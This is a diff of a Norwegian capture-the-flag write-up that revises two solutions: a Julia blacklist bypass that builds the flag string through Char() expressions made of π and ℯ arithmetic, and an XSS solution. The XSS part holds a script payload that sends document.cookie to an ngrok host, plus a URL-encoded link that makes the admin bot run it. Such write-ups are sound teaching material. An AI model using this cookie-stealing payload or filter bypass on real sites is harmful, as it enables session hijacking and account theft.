@@ -527,13 +527,13 @@ if v == "Jeg er snill og fortjener flagget fra nissen!"
 
 ### Løsning
 
-Om vi ser igjennom listen finner vi ut at bokstavene `C`, `h`, `a`, `r`, `(` og `)` ikke er svartelistet. I Julia brukes `*` for å kombinere tekst, og denne er heller ikke svartelistet. Derfor mangler vi bare en måte å generere tall.
+Om vi ser igjennom listen finner vi ut at bokstavene `C`, `h`, `a`, `r`, `(` og `)` ikke er svartelistet. I Julia brukes `*` for å kombinere tekst, og denne er heller ikke svartelistet. Derfor vet jeg at vi klare å lage teksten dersom vi nå kan finne en måte å lage alle ulike tall.
 
 Tallene kan genereres på to måter:
 
-boolske uttrykk, slik som `()≡()` gir true (1) som så kan settes sammen slik: `()≡()--()≡()` for å lage tallet 2 osv.
+boolske uttrykk, slik som `()≡()` gir true (1), der `≡` er det samme som == i python. Vi kan da bruke dobbel hyphen til å settes samme ett og ett tall slik: `()≡()--()≡()` for å lage tallet 2 osv.
 
-eller ved å bruke matematiske symboler, slik som `π` og `ℯ` (ikke e) og `÷` (integer division) for å gjøre at tallene kan brukes i Char(). Vi kan også bruke `√`, `∛` og `∜` for å optimalisere uttrykkene:
+En annen metode er å bruke spesielle matematiske symboler, slik som `π` og `ℯ` (spesiell e) og `*`, sammen med `÷` (integer division) for å sikre at vi har heltall som brukes i funksjonen Char(). Vi kan også bruke `√`, `∛` og `∜` for å optimalisere uttrykkene:
 
 ```py
 import requests
@@ -562,20 +562,20 @@ translation = {
 
 code = ""
 for value in pt:
-    code += f"*Char({translation[value]})"
+    code += f"Char({translation[value]})"
 
-print(code[1:])
+print(code)
 
 response = requests.get("http://localhost:8080/?input=" + code[1:])
 
 if(response.text == "JUL{testflagg}"):
-    print(f"Works and is: {len(code)}")
+    print(f"Tested, and it works: {len(code)}")
 ```
 
 Koden blir:
 
 ```
-Char(π*ℯ*ℯ*ℯ√ℯ÷∛ℯ)*Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∛π)*Char(π*ℯ*ℯ*ℯ*ℯ*ℯ÷ℯ÷√ℯ)*Char(ℯ*ℯ*π√π÷√√ℯ)*Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∛π)*Char(ℯ*ℯ*π*π√π÷√√√ℯ)*Char(ℯ*ℯ*π√π÷√√ℯ)*Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∜ℯ)*Char(π*π*ℯ÷√π*ℯ*ℯ*ℯ÷ℯ)*Char(π*π*π*π∛ℯ÷∜ℯ)*Char(π*π*π*ℯ√ℯ÷∜ℯ)*Char(π*π*π*ℯ√ℯ÷∜ℯ)*Char(ℯ*ℯ*π√π÷√√ℯ)*Char(π*π*π*π∛π÷∜ℯ)*Char(π*ℯ*ℯ*ℯ*ℯ*ℯ÷ℯ÷√ℯ)*Char(ℯ*ℯ*π√π÷√√ℯ)*Char(π*π∛π*π*π÷∛ℯ)*Char(π*π*π*π∛π÷∜ℯ)*Char(ℯ*ℯ*π*π√π÷√√√ℯ)*Char(π*π*π*ℯ√π÷∜ℯ)*Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∛ℯ)*Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∛π)*Char(π*π*ℯ÷√π*ℯ*ℯ*ℯ÷ℯ)*Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∛π)*Char(ℯ*ℯ*π*π√π÷√√√ℯ)*Char(ℯ*ℯ*π√π÷√√ℯ)*Char(π*π∛π*π*π÷∛ℯ)*Char(π*π*π*ℯ√ℯ÷∜ℯ)*Char(π*π*π*π*π÷π)*Char(π*ℯ*ℯ*ℯ*ℯ*ℯ÷ℯ÷√ℯ)*Char(π*ℯ*ℯ*ℯ*ℯ*ℯ÷ℯ÷√ℯ)*Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∛π)*Char(π*π*π*ℯ√π÷∜ℯ)*Char(ℯ*ℯ*π√π÷√√ℯ)*Char(π*π∛π*π*π÷∛ℯ)*Char(ℯ*ℯ*π*π√π÷√√√ℯ)*Char(π*π*π*π*π÷π)*Char(ℯ*ℯ*π√π÷√√ℯ)*Char(π*π*ℯ÷√π*ℯ*ℯ*ℯ÷ℯ)*Char(π*π*π*π∛ℯ÷∜ℯ)*Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∜ℯ)*Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∜ℯ)*Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∛π)*Char(π*π*ℯ÷√π*ℯ*ℯ*ℯ÷ℯ)*Char(ℯ*ℯ*ℯ*ℯ÷√ℯ)
+Char(π*ℯ*ℯ*ℯ√ℯ÷∛ℯ)Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∛π)Char(π*ℯ*ℯ*ℯ*ℯ*ℯ÷ℯ÷√ℯ)Char(ℯ*ℯ*π√π÷√√ℯ)Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∛π)Char(ℯ*ℯ*π*π√π÷√√√ℯ)Char(ℯ*ℯ*π√π÷√√ℯ)Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∜ℯ)Char(π*π*ℯ÷√π*ℯ*ℯ*ℯ÷ℯ)Char(π*π*π*π∛ℯ÷∜ℯ)Char(π*π*π*ℯ√ℯ÷∜ℯ)Char(π*π*π*ℯ√ℯ÷∜ℯ)Char(ℯ*ℯ*π√π÷√√ℯ)Char(π*π*π*π∛π÷∜ℯ)Char(π*ℯ*ℯ*ℯ*ℯ*ℯ÷ℯ÷√ℯ)Char(ℯ*ℯ*π√π÷√√ℯ)Char(π*π∛π*π*π÷∛ℯ)Char(π*π*π*π∛π÷∜ℯ)Char(ℯ*ℯ*π*π√π÷√√√ℯ)Char(π*π*π*ℯ√π÷∜ℯ)Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∛ℯ)Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∛π)Char(π*π*ℯ÷√π*ℯ*ℯ*ℯ÷ℯ)Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∛π)Char(ℯ*ℯ*π*π√π÷√√√ℯ)Char(ℯ*ℯ*π√π÷√√ℯ)Char(π*π∛π*π*π÷∛ℯ)Char(π*π*π*ℯ√ℯ÷∜ℯ)Char(π*π*π*π*π÷π)Char(π*ℯ*ℯ*ℯ*ℯ*ℯ÷ℯ÷√ℯ)Char(π*ℯ*ℯ*ℯ*ℯ*ℯ÷ℯ÷√ℯ)Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∛π)Char(π*π*π*ℯ√π÷∜ℯ)Char(ℯ*ℯ*π√π÷√√ℯ)Char(π*π∛π*π*π÷∛ℯ)Char(ℯ*ℯ*π*π√π÷√√√ℯ)Char(π*π*π*π*π÷π)Char(ℯ*ℯ*π√π÷√√ℯ)Char(π*π*ℯ÷√π*ℯ*ℯ*ℯ÷ℯ)Char(π*π*π*π∛ℯ÷∜ℯ)Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∜ℯ)Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∜ℯ)Char(ℯ*ℯ*ℯ*ℯ*ℯ÷∛π)Char(π*π*ℯ÷√π*ℯ*ℯ*ℯ÷ℯ)Char(ℯ*ℯ*ℯ*ℯ÷√ℯ)
 ```
 
 <details>
@@ -860,13 +860,13 @@ Jeg utnytter at siden for å søke etter bilder viser søketeksten på skjermen 
 XSS script (kan bruke ngrok, webhook, burp, osv.):
 
 ```html
-<script>fetch("https://b7a3-92-220-16-80.ngrok-free.app/?"+document.cookie);</script>
+<script>fetch("https://b73ab-8c65ac-75acf.ngrok-free.app/?"+document.cookie);</script>
 ```
 
 URL julenissen kan besøke for å trigge scriptet:
 
 ```
-https://_usercode_-nissekjeks.julew.tf/search?query=%3Cscript%3Efetch(%22https%3A%2F%2Fb7a3-92-220-16-80.ngrok-free.app%2F%3F%22%2Bdocument.cookie)%3B%3C%2Fscript%3E
+https://_usercode_-nissekjeks.julew.tf/search?query=%3Cscript%3Efetch(%22https%3A%2F%2Fb73ab-8c65ac-75acf.ngrok-free.app%2F%3F%22%2Bdocument.cookie)%3B%3C%2Fscript%3E
 ```
 
 Jeg får nå tilsendt julenissens (admins) cookies:
